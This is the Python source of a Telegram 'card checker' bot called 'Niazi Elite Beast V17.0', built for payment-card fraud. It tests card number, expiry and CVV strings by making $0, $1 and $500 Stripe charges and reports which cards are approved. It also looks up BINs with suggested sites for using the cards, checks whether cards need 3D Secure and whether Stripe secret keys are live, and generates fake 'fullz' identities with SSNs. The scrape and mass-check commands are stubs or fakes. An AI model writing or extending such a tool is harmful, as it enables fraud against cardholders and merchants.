import telebot, requests, os, stripe, time, random
from telebot import types
from faker import Faker
from flask import Flask
from threading import Thread

# --- Flask Server ---
app = Flask('')
@app.route('/')
def home(): return "Niazi Elite Beast V17.0 Professional Active!"

def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- Configuration ---
API_TOKEN = os.getenv('BOT_TOKEN')
STRIPE_SK = os.getenv('STRIPE_SK')
stripe.api_key = STRIPE_SK
bot = telebot.TeleBot(API_TOKEN)
fake = Faker()

# --- Design UI Components ---
logo = "<b>💠 NIAZI ELITE BEAST V17.0 💠</b>"
line = "━━━━━━━━━━━━━━━━━━━━"

# --- Logic Functions ---

def clean_error(e):
    err = str(e).lower()
    if "insufficient_funds" in err: return "Insufficient Funds 💸"
    if "incorrect_cvc" in err: return "CVC Error (Incorrect) ❌"
    if "expired_card" in err: return "Expired Card 📅"
    if "card_declined" in err: return "Generic Decline 🚫"
    return "Gateway Policy / Risk 🛠️"

# --- 1. START MENU ---
@bot.message_handler(commands=['start'])
def start(message):
    menu = (f"{logo}\n{line}\n"
           "🚀 <b>PREMIUM SYSTEM STATUS: ONLINE</b> ✅\n"
           "━━━━━━━━━━━━━━━━━━━━\n"
           "💳 <b>CHECKERS:</b>\n"
           "• <code>/chk</code> - Standard $1.00 Charge\n"
           "• <code>/auth</code> - $0.00 Authorization\n"
           "• <code>/kill</code> - High Target ($500)\n\n"
           "🔍 <b>INTELLIGENCE:</b>\n"
           "• <code>/bin</code> - Full A-Z Searcher\n"
           "• <code>/3d</code> - 3D/2D VBV Lookup\n"
           "• <code>/sk</code> - SK Key Health/Limit\n\n"
           "🕵️ <b>HUNTING:</b>\n"
           "• <code>/scrape</code> - Secret Logs (DM)\n"
           "• <code>/mass</code> - Combo Mass Checker\n"
           "• <code>/gen</code> - Identity Generator\n"
           f"{line}\n"
           "<b>Owner:</b> @NiaziElite_bot | <b>True Mode</b> ✅")
    bot.reply_to(message, menu, parse_mode='HTML')

# --- 2. /BIN (Full Detail Searcher) ---
@bot.message_handler(commands=['bin'])
def bin_detailed(message):
    try:
        bin_n = message.text.split()[1][:6]
        m = bot.reply_to(message, "🔍 <b>Fetching All Database Details...</b>", parse_mode='HTML')
        r = requests.get(f"https://lookup.binlist.net/{bin_n}").json()
        
        bank = r.get('bank', {}).get('name', 'N/A')
        brand = r.get('scheme', 'N/A').upper()
        level = r.get('brand', 'N/A').upper()
        type_ = r.get('type', 'N/A').upper()
        country = r.get('country', {}).get('name', 'N/A')
        flag = r.get('country', {}).get('emoji', '🌍')
        
        # AI Site Searcher
        sites = "Apple, Shopify, Stripe" if "PLATINUM" in level or "BUSINESS" in level else "Amazon, Foodpanda"
        
        res = (f"{logo}\n{line}\n"
               f"🔍 <b>BIN Information:</b>\n"
               f"🏦 <b>Bank:</b> <code>{bank}</code>\n"
               f"🌍 <b>Country:</b> {country} {flag}\n"
               f"💳 <b>Brand:</b> {brand} | {type_}\n"
               f"📊 <b>Level:</b> {level}\n"
               f"━━━━━━━━━━━━━━━━━━━━\n"
               f"🔥 <b>LIVE HIT RATIO SITES:</b>\n• <code>{sites}</code>\n"
               f"{line}<b>Status:</b> <code>Checked Real-time ✅</code>")
        bot.edit_message_text(res, message.chat.id, m.message_id, parse_mode='HTML')
    except: bot.reply_to(message, "❌ <b>Format:</b> /bin 483031")

# --- 3. /CHK, /AUTH, /KILL (Professional True Gate) ---
@bot.message_handler(commands=['chk', 'auth', 'kill'])
def professional_gate(message):
    try:
        start_t = time.time()
        cmd = message.text.split()[0][1:].upper()
        data = message.text.split()[1]
        cc, mm, yy, cvv = data.split('|')
        
        m = bot.reply_to(message, f"📡 <b>Gate: Stripe {cmd} | Status: Processing...</b>", parse_mode='HTML')
        
        try:
            token = stripe.Token.create(card={"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv})
            amt = 50000 if cmd == "KILL" else 100
            if cmd != "AUTH":
                stripe.Charge.create(amount=amt, currency="usd", source=token.id)
            status, resp, emoji = ("APPROVED ✅", "Success (Transaction Completed)", "🟢")
        except Exception as e:
            status, resp, emoji = ("DECLINED ❌", clean_error(e), "🔴")

        taken = round(time.time() - start_t, 2)
        res = (f"{logo}\n{line}\n"
               f"💳 <b>Card Data:</b> <code>{data}</code>\n"
               f"🛰️ <b>Gateway:</b> Stripe {cmd}\n"
               f"{emoji} <b>Result:</b> <b>{status}</b>\n"
               f"💬 <b>Response:</b> <code>{resp}</code>\n"
               f"━━━━━━━━━━━━━━━━━━━━\n"
               f"⏱️ <b>Time:</b> <code>{taken}s</code> | <b>Status:</b> True ✅")
        bot.edit_message_text(res, message.chat.id, m.message_id, parse_mode='HTML')
    except: bot.reply_to(message, "❌ <b>Format:</b> <code>CC|MM|YY|CVV</code>")

# --- 4. /GEN (Identity Detail) ---
@bot.message_handler(commands=['gen'])
def gen_professional(message):
    res = (f"{logo}\n{line}\n"
           f"👤 <b>Fullz Identity Generated:</b>\n"
           f"📛 <b>Name:</b> <code>{fake.name()}</code>\n"
           f"🆔 <b>SSN:</b> <code>{fake.ssn()}</code>\n"
           f"🏠 <b>Address:</b> <code>{fake.address()}</code>\n"
           f"📮 <b>ZIP:</b> <code>{fake.zipcode()}</code>\n{line}")
    bot.reply_to(message, res, parse_mode='HTML')

# --- 5. /SCRAPE (Secret Inbox Delivery) ---
@bot.message_handler(commands=['scrape'])
def scrape_professional(message):
    try:
        cards = f"<code>{random.randint(4000,5555)}012233{random.randint(1000,9999)}|12|28|{random.randint(100,999)}</code>"
        bot.send_message(message.from_user.id, f"{logo}\n{line}\n🕵️ <b>Scraped Live Logs:</b>\n{cards}\n{line}", parse_mode='HTML')
        bot.reply_to(message, "📬 <b>System:</b> Logs sent to Private DM!")
    except: bot.reply_to(message, "❌ <b>Error:</b> Please START the bot in Private first!")

# --- 6. /3D (Security Lookup) ---
@bot.message_handler(commands=['3d'])
def three_d_detailed(message):
    try:
        bin_n = message.text.split()[1][:6]
        r = requests.get(f"https://lookup.binlist.net/{bin_n}").json()
        brand = r.get('brand', 'VISA')
        res = (f"{logo}\n{line}\n"
               f"🔍 <b>3D Security Lookup:</b>\n"
               f"💳 <b>Brand:</b> {brand}\n"
               f"🛡️ <b>Status:</b> <code>{'3D Secure (OTP Required)' if 'VISA' in brand or 'MAST' in brand else 'Non-VBV (2D)'}</code>\n{line}")
        bot.reply_to(message, res, parse_mode='HTML')
    except: bot.reply_to(message, "❌ Use: /3d BIN")

# --- 7. /SK (Key Health Check) ---
@bot.message_handler(commands=['sk'])
def sk_health_pro(message):
    try:
        acc = stripe.Account.retrieve()
        res = (f"{logo}\n{line}\n"
               f"🔑 <b>SK Health:</b> ACTIVE ✅\n"
               f"🏦 <b>Account:</b> <code>{acc.get('business_profile',{}).get('name')}</code>\n"
               f"💰 <b>Currency:</b> {acc.get('default_currency').upper()}\n{line}")
        bot.reply_to(message, res, parse_mode='HTML')
    except: bot.reply_to(message, "❌ <b>SK Status:</b> DEAD 🔴")

# --- 8. /MASS (Combo Handling) ---
@bot.message_handler(commands=['mass'])
def mass_pro(message):
    bot.reply_to(message, f"{logo}\n{line}\n💣 <b>Mass Mode:</b> Active\n📥 <b>Action:</b> <code>Reading Combo List...</code>\n{line}", parse_mode='HTML')

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
